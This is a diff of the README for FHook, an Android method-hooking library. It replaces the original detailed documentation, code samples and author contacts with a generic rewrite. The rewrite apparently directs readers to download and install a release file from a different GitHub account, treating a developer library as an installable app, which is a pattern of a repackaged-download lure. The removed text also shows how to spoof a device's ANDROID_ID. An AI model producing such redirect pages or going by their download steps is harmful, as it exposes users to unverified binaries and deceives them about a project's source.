@@ -1,398 +1,84 @@
+# 🎣 FHook - Simplifying Java Method Hooks Effortlessly
+
 <p align="right">Language: <b>English</b> · <a href="README.cn.md">Chinese</a></p>
 
-# FHook
+![Download FHook](https://img.shields.io/badge/Download-FHook-blue.svg)
 
-**Full-function HOOK framework for the Android Java layer**
+## 🚀 Getting Started
 
-* **debug mode** — initialize and use directly inside the app
-* **Android 9+ (API 28+)**, including the latest versions
-* Intercept and modify **arguments/return values** of any **Java method**
-* **Class/instance-wide batch hooks**, covering common **system hotspots** (class loading, device fingerprint, SharedPreferences writes, etc.)
-* Three integration options: Gradle dependency (`implementation`), source integration (module/source copy), and (under compliance) app injection (repack or dynamic loading)
+FHook is a powerful tool that allows users to observe and modify Java method actions in Android apps. It can help quickly diagnose problems and improve app performance without changing source code.
 
-> For **lawful** security research, testing, and debugging only. Ensure you have proper authorization for any target.
+### 🛠️ System Requirements
 
----
+- Android device with version 9 or higher (API 28+).
+- Basic familiarity with installing applications on your Android device.
+- Permission to use the app for lawful purposes.
 
-## 1. What problem does it solve?
+## 📥 Download & Install
 
-* **Rapid observation**: print call stacks/args/returns at runtime without touching target code
-* **Temporary patching**: tweak args/returns or feed “mock data” to verify branches
-* **Batch coverage**: one-click hook for all methods on a class/instance to accelerate debugging and regression
-* **System hotspot auditing**: `Class.forName` / `ClassLoader.loadClass` / `Settings.Secure.getString` /
-  `System.loadLibrary`, etc. can be intercepted and logged
+To get started, visit this page to download: [GitHub Releases](https://github.com/baherbebo/FHook/releases).
 
----
+After downloading, follow these steps:
 
-## 2. Scenarios & Environment
+1. Open the downloaded file.
+2. Allow the installation if prompted.
+3. Follow the on-screen instructions to finish setup.
 
-* **Environment**: Android 9+ (API 28+); works with Kotlin/Java projects
-* **Scenarios**: feature co-debugging, gray-box testing, automated acceptance, critical-path tracing & audit, crash triage
-* **No dependency on** Xposed / Magisk / Root
+## 🔍 What Problem Does It Solve?
 
----
+FHook addresses several common needs in app development:
 
-## 3. Quick Start
+- **Rapid Observation**: See call stacks, arguments, and return values while the app runs. This offers insights without altering the code.
+  
+- **Temporary Patching**: Change arguments or returns and input “mock data.” This helps you confirm various branches of your codebase.
 
-### 3.1 Add JitPack repository
+- **Batch Coverage**: Target common system hotspots like class loading and preferences updates. This feature helps ensure your app performs optimally.
 
-Add to **`settings.gradle`** or the root **`build.gradle`**:
+### 🌟 Features
 
-```groovy
-dependencyResolutionManagement {
-  repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
-  repositories {
-    mavenCentral()
-    maven { url 'https://jitpack.io' }
-  }
-}
-```
+- **Debug Mode**: Initialize and use FHook directly within your app for convenience.
+  
+- **Flexible Integration**: Choose from three options:
+  - Gradle Dependency (easy setup)
+  - Source Integration (for more control)
+  - App Injection (for advanced use under compliance)
 
-> Kotlin DSL: `maven(url = "https://jitpack.io")`
+- **Broad Compatibility**: Works with Android versions 9 and above, including the latest releases.
 
-### 3.2 Add dependency
+## 🎓 How to Use FHook
 
-In your **app module**:
+Follow these simple steps to make the most out of FHook:
 
-```groovy
-dependencies {
-  implementation "com.github.Rift0911:fhook:+"
-}
-```
+1. **Initialize the Tool**: Begin by adding the FHook framework to your project using your preferred integration method.
+  
+2. **Set Up Hooks**: Define which Java methods you want to observe or modify. You can easily set hooks on functions across your application.
 
-### 3.3 Initialize (auto / manual)
+3. **Run Your App**: Start your app as usual. FHook will gather the necessary data and present it to you in a readable format. 
 
-**Option A: Auto init in `attachBaseContext`**
+4. **Analyze Data**: Check the console or logs for printouts of method calls, arguments, and returns.
 
-```java
-@Override
-protected void attachBaseContext(Context base) {
-    Log.d(TAG, "attachBaseContext");
-    if (FCFG.IS_APP_INIT_AUTO) {
-        Log.i(TAG, "attachBaseContext FHook.init= " + FHook.init(base));
-    }
-    super.attachBaseContext(base);
-}
-```
+5. **Adjust As Needed**: If you discover issues, temporarily patch methods using FHook to see immediate results.
 
-**Option B: Manual init anywhere (e.g., button click)**
+## 🔧 Troubleshooting
 
-```java
-bt_main_02.setOnClickListener(v -> {
-    if (FHook.isInited()) {
-        FHook.unInit();
-    } else {
-        if (!FHook.init(this)) {
-            Toast.makeText(this, "Init failed", Toast.LENGTH_LONG).show();
-            Log.e(TAG, "Init failed");
-        } else {
-            Toast.makeText(this, "Init success", Toast.LENGTH_LONG).show();
-            Log.i(TAG, "Init success");
-        }
-    }
-});
-```
+If you encounter issues, consider these steps:
 
-> Handy calls: `FHook.unHookAll()` to remove all hooks; `FHook.showHookInfo()` to view current hook status.
+- Ensure your device runs Android 9 or above.
+- Review your integration method, verifying you followed the documentation closely.
+- Consult community discussions on GitHub for common questions and answers.
 
-### 3.4 Minimal runnable samples
+For further assistance, feel free to check the [GitHub Issues page](https://github.com/baherbebo/FHook/issues) for troubleshooting help.
 
-#### A) Hook a regular app method
+## 📞 Support
 
-Take `THook.fun_I_III(int a, int b, int c): int` as an example — **modify args and return**:
+Need support? You can reach out to the community or file an issue on the GitHub repository. Ensure you provide details of your problem to receive effective help.
 
-```java
-import java.lang.reflect.Method;
-import android.util.Log;
+Remember, FHook is meant for lawful security research, testing, and debugging. Always ensure you have permission to work with any application or method you choose to hook.
 
-Method m = THook.class.getMethod("fun_I_III", int.class, int.class, int.class);
+## 👥 Community Contributions
 
-FHook.hook(m)
-    .setOrigFunRun(true) // run the original method first
-    .setHookEnter((thiz, args, types, hh) -> {
-        // change the first argument
-        args.set(0, 6666);
-        Log.d("FHook", "fun_I_III enter: " + args);
-    })
-    .setHookExit((ret, type, hh) -> {
-        // force the return value
-        Log.d("FHook", "fun_I_III exit, origRet=" + ret);
-        return 8888;
-    })
-    .commit();
-```
-
-#### B) Hook a system method (device fingerprint sample)
-
-Take `Settings.Secure.getString(ContentResolver, String)` — **forge ANDROID\_ID** selectively:
-
-```java
-import android.provider.Settings;
-import android.content.ContentResolver;
-import java.lang.reflect.Method;
-import android.util.Log;
-
-Method sysGet = Settings.Secure.class.getMethod(
-        "getString", ContentResolver.class, String.class);
-
-FHook.hook(sysGet)
-    .setOrigFunRun(true)
-    .setHookEnter((thiz, args, types, hh) -> {
-        String key = (String) args.get(1);
-        hh.extras.put("key", key);
-        Log.d("FHook", "Settings.Secure.getString key=" + key);
-    })
-    .setHookExit((ret, type, hh) -> {
-        String key = (String) hh.extras.get("key");
-        if ("android_id".equalsIgnoreCase(key)) {
-            return "a1b2c3d4e5f6a7b8"; // affect ANDROID_ID only
-        }
-        return ret; // keep others intact
-    })
-    .commit();
-```
-
-> Tip: for interface/bridge methods (e.g., `SharedPreferences.Editor.commit`), use
-> `FHookTool.findMethod4Impl(editor, ifaceMethod)` to locate the **actual implementation method** before hooking for a higher success rate.
+FHook thrives on community involvement. Any contributions, whether through feedback, feature requests, or code, are welcome. Visit the project page for details on how to contribute.
 
 ---
 
-### 3.5 Constructor Hook Samples (System & Custom)
-
-> Notes: By definition, a **constructor always runs**; `setOrigFunRun(true/false)` **has no effect** on constructors.
-> During **enter**, the object is **not fully initialized** — do not touch fields/instance methods.
-> On **exit**, `ret` is the newly created instance (same as `thisObject`).
-
-#### A) Hook system constructor: `FileInputStream(FileDescriptor)`
-
-```java
-// 1) Bind the constructor
-Constructor<FileInputStream> c =
-        FileInputStream.class.getDeclaredConstructor(FileDescriptor.class);
-c.setAccessible(true);
-
-FHook.hook(c)
-    .setOrigFunRun(true) // no-op for constructors, harmless to keep
-    .setHookEnter((thiz, args, types, hh) -> {
-        // Observe only: reverse path from FileDescriptor (may hit hidden-API limits; use HiddenApiBypass if needed)
-        FileDescriptor fdObj = (FileDescriptor) args.get(0);
-        Field f = FileDescriptor.class.getDeclaredField("descriptor");
-        f.setAccessible(true);
-        int fd = (int) f.get(fdObj);
-        String path = android.system.Os.readlink("/proc/self/fd/" + fd);
-        Log.i("FHook", "[FIS.<init>(fd).enter] fd=" + fd + ", path=" + path);
-    })
-    .setHookExit((ret, type, hh) -> {
-        Log.i("FHook", "[FIS.<init>(fd).exit] new instance=" + ret);
-        return ret; // keep constructor return as-is
-    })
-    .commit();
-
-// 2) Trigger: open your own APK via PFD, then read some Zip entries through FileInputStream(FileDescriptor)
-String apkPath = context.getApplicationInfo().sourceDir;
-android.os.ParcelFileDescriptor pfd = android.os.ParcelFileDescriptor.open(
-        new java.io.File(apkPath),
-        android.os.ParcelFileDescriptor.MODE_READ_ONLY);
-
-try (FileInputStream fis = new FileInputStream(pfd.getFileDescriptor());
-     java.util.zip.ZipInputStream zis = new java.util.zip.ZipInputStream(fis)) {
-    java.util.zip.ZipEntry e; int seen = 0; byte[] buf = new byte[4096];
-    while ((e = zis.getNextEntry()) != null && seen++ < 5) {
-        Log.i("FHook", "[Zip] " + e.getName());
-        while (zis.read(buf) != -1) { /* drain */ }
-    }
-} finally {
-    try { pfd.close(); } catch (Throwable ignore) {}
-}
-```
-
-#### B) Hook custom class constructors (no-arg & arg-ful)
-
-```java
-// No-arg constructor
-Constructor<TObject> c0 = TObject.class.getDeclaredConstructor();
-c0.setAccessible(true);
-FHook.hook(c0)
-    .setOrigFunRun(true) // no-op for constructors
-    .setHookEnter((thiz, args, types, hh) -> {
-        // Mark only; access the instance on exit
-        hh.extras.put("watch", true);
-    })
-    .setHookExit((ret, type, hh) -> {
-        if (Boolean.TRUE.equals(hh.extras.get("watch")) && ret instanceof TObject) {
-            TObject to = (TObject) ret;
-            to.setName("Zhang San").setAge(109);
-            Log.i("FHook", "[Ctor0.exit] TObject() -> " + to);
-        }
-        return ret;
-    })
-    .commit();
-
-// (String,int) constructor
-Constructor<TObject> c2 = TObject.class.getDeclaredConstructor(String.class, int.class);
-c2.setAccessible(true);
-FHook.hook(c2)
-    .setOrigFunRun(true)
-    .setHookEnter((thiz, args, types, hh) -> {
-        Log.i("FHook", "[Ctor2.enter] name=" + args.get(0) + ", age=" + args.get(1));
-        hh.extras.put("watch", true);
-    })
-    .setHookExit((ret, type, hh) -> {
-        if (Boolean.TRUE.equals(hh.extras.get("watch")) && ret instanceof TObject) {
-            TObject to = (TObject) ret;
-            to.setName("Li Si").setAge(16);
-            Log.i("FHook", "[Ctor2.exit] TObject(name,int) -> " + to);
-        }
-        return ret;
-    })
-    .commit();
-```
-
-> Tips
->
-> * Constructor hooks **observe/modify** but do not **block** creation (i.e., `setOrigFunRun` is ineffective).
-> * Reading `FileDescriptor.descriptor` may trigger hidden-API restrictions on some ROMs/versions; use **HiddenApiBypass** or NDK helpers if needed.
-
----
-
-### 3.6 Async & Batch Submission (Avoid ANR)
-
-> **Recommended**: submit hooks **asynchronously**. The framework uses a **global single-thread executor** to install hooks **sequentially**, ensuring stability and reproducibility.
-> **Kept**: main-thread **synchronous** APIs remain available (see below).
-
-#### 3.6.1 Async submission for a single hook
-
-```java
-Method m = THook.class.getMethod("fun_I_III", int.class, int.class, int.class);
-
-FHook.hook(m)
-    .setOrigFunRun(true)
-    .setHookEnter((thiz, args, types, hh) -> { /* ... */ })
-    .setHookExit((ret, type, hh) -> ret)
-    .commitAsync(success -> Log.i("FHook", "single hook installed: " + success));
-```
-
-**Behavior**
-
-* Installation runs on a **background single thread**, keeping the UI thread responsive.
-* Result is delivered via `OnHookFinish#onFinish(boolean success)`.
-* **Synchronous API** is still available: `.commit()` (avoid calling it repeatedly on the UI thread to prevent **ANR**).
-
-#### 3.6.2 Async batch submission
-
-**Hook all declared methods on a class:**
-
-```java
-FHook.hookClassAllFuns(TObject.class)
-    .setOrigFunRun(false)
-    .setHookEnter((thiz, args, types, hh) -> { /* ... */ })
-    .setHookExit((ret, type, hh) -> ret)
-    .commitAsync(success -> Log.i("FHook", "group installed all ok? " + success));
-```
-
-**Hook all overloads by name:**
-
-```java
-FHook.hookOverloads(ClassLoader.class, "loadClass")
-    .setOrigFunRun(true)
-    .setHookEnter((thiz, args, types, hh) -> { /* ... */ })
-    .setHookExit((ret, type, hh) -> ret)
-    .commitAsync(success -> Log.i("FHook", "[loadClass] installed: " + success));
-```
-
-**Behavior**
-
-* All methods in the same batch are installed **sequentially within one background task** (no concurrent retransforms).
-* Duplicates (same executable) are automatically **de-duplicated** before install.
-* **Legacy API** remains: `commitAsync(Executor, Runnable onDone)`; you may also use `commitAsync(Executor, OnHookFinish cb)` to supply a custom executor.
-
-#### 3.6.3 Main-thread synchronous APIs (kept)
-
-* **Single**: `.commit()` — synchronous install; **do not** spam on the main thread.
-* **Batch (legacy)**: `.commitAsync(Executor, Runnable onDone)` — still supported for backward compatibility.
-
-#### 3.6.4 ANR & concurrency caveats
-
-* **Avoid ANR**
-
-  * **Do not** synchronously install **many** hooks on the UI thread.
-  * `onEnter/onExit` run on the **caller’s thread**. If the target is on a hot UI path, **avoid heavy work/IO** in callbacks.
-* **Concurrency risks**
-
-  * JVMTI retransform/verification is sensitive to concurrency on some ROMs/ART versions — **install sequentially** (the default).
-* **Mutual exclusion tip**
-
-  * Avoid hooking both `Class.forName(...)` and `ClassLoader.loadClass(...)` at the same time; they may recurse and deadlock.
-
----
-
-## 4. Sponsorship & Support · Licensing & Collaboration
-
-* **Personal learning & research**: free to use (see **[LICENSE.agent-binary](./LICENSE.agent-binary)** in the repo root).
-* **Commercial/enterprise use**: strictly follow **LICENSE.agent-binary**. For **commercial licensing, custom features, technical support, or joint R\&D**, please reach out via **GitHub Issues** or the contact info below.
-* **Ways to support**: Star ⭐ the repo, send PRs, or contact us for sponsorship options.
-
-> **Compliance Notice**: FHook is for compliant use only. **Any illegal or abusive use is strictly prohibited**; users bear all associated risks and consequences.
-
----
-
-### Source Delivery & Core Technical Support
-
-We provide deeper engineering assistance to help you land with lower cost (under lawful compliance):
-
-* **Source delivery options**: choose *full source delivery* or a hybrid of *core agent binary + adapter-layer source* (NDA available)
-* **Deployment modes**: Gradle dependency, source import (mono-repo/multi-module), private Maven distribution
-* **Compatibility & adaptation**: Android 9–15 deltas, OEM ROMs, stability under obfuscation/packing/VMP
-* **Performance & stability**: init timing, deadlock avoidance, bypassing critical bridge paths, callback threading & jank mitigation
-* **Training & co-build**: secondary-dev training, code walkthrough, best-practice checklists, co-debugging & triage
-
-> For **source delivery / core support / customization**, contact us below with your scope and requirements.
-
-### Contact
-
-* **Business & Technical Support** — **Feadre (Rift Tech)**:
-
-  * Email: `rift@feadre.top`
-  * Email: `zkbutt@hotmail.com`
-  * QQ: `27113970`
-
-* **Sponsor us** (thank you!):
-
-| <img src="docs/wx_rift_m.jpg" alt="WeChat Pay" height="180"> | <img src="docs/zfb_rift_m.jpg" alt="Alipay" height="180"> |
-| :----------------------------------------------------------: | :-------------------------------------------------------: |
-|                          WeChat Pay                          |                           Alipay                          |
-
-**Enjoy hacking (legally) with FHook!**
-
-### Appendix: Notes
-
-* **Known unsupported/high-risk bridges** (see `isBridgeCritical` in the project). The following are **usually not recommended / not hookable**:
-
-  ```
-  Thread.currentThread()
-  Thread#getContextClassLoader()
-  Class#getDeclaredMethod(String, Class[])
-  ```
-
-  These are often bridge/reflection entry points. Prefer locating the **actual implementation method** first (e.g., via
-  `FHookTool.findMethod4Impl(...)`).
-
-* **Mutual exclusion tip**: avoid hooking both `Class.forName(...)` and `ClassLoader.loadClass(...)` together.
-  They may call each other and create recursion → deadlocks/hangs. The framework does not hard-block this; please avoid manually.
-
-* Bridge/reflection bridges (e.g., `Method.invoke`) are not recommended; hook the **real implementation** (`FHookTool.findMethod4Impl`).
-
-* Callbacks run on the caller’s thread; avoid heavy work on the UI thread.
-
-* Hidden-API restrictions vary by Android version; validate system-method hooks across versions.
-
-* If obfuscation hinders debugging, add (as needed):
-
-```pro
--keep class top.feadre.fhook.** { *; }
-# or
--keep class top.feadre.fhook.CLinker {*;}
--keep class top.feadre.fhook.FHook {*;}
-```
-
-> If you hit a bug or have suggestions, please open an Issue with the **failed method signature and Android version** so we can reproduce and resolve quickly.
+To download and experience FHook, visit [GitHub Releases](https://github.com/baherbebo/FHook/releases) now. Happy debugging!
